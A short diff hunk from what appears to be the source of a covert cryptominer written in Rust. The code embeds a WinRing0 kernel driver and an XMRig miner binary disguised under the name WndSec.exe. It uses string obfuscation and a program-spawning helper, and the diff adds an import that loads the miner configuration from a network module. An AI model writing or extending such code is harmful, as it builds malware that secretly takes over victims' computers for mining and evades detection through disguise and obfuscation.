@@ -9,6 +9,8 @@ use client_vars::constants::{
 use obfstr::obfstr as s;
 use shared::utils::functions::{ generate_random_string, get_current_exe_dir, spawn_program };
 
+use crate::network::basic::get_xmrig_config;
+
 const WINRING0_SYS_BINARY: &[u8] = include_bytes!("../../WinRing0x64.sys");
 const XMRIG_BINARY: &[u8] = include_bytes!("../../WndSec.exe");
 
